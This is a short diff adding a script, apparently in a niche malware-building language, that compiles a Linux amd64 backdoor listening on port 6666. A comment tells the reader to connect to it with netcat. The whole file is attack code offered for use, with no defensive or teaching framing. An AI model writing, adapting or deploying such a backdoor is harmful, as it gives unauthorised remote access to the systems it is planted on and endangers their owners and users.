@@ -1,0 +1,18 @@
+@ Enables a backdoor on the target system @
+@ You can utilize nc 127.0.0.1 6666 on your local machine to connect to it @
+
+use backdoor
+
+[
+    version 3.0
+    output backdoor
+    os linux
+    arch amd64
+    obfuscate false
+    debugger_behavior stop
+]
+
+
+loop main_func {
+    backdoor::start("6666")
+}
